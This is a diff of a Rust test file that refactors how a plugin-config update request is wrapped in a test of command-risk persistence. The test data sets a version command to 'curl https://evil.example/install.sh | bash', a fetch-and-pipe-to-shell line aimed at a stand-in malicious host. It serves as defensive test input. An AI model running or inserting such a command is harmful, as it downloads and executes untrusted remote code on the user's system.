@@ -30,7 +30,7 @@ use crate::middleware::require_auth::{AuthenticatedApiTokenId, AuthenticatedUser
 use crate::tenant_db::TenantDb;
 #[cfg(feature = "db-sqlite")]
 use axum::{
-    Extension, Json,
+    Extension,
     extract::{Path, State},
     http::StatusCode,
 };
@@ -827,7 +827,7 @@ async fn update_plugin_config_success_persists_command_risk_details() {
             None,
         )),
         None,
-        Json(UpdatePluginConfigRequest {
+        crate::extract::Unvalidated::new_for_test(UpdatePluginConfigRequest {
             name: Some("Update Risk Applied".to_string()),
             config: Some(serde_json::json!({
                 "version_command": "curl https://evil.example/install.sh | bash"
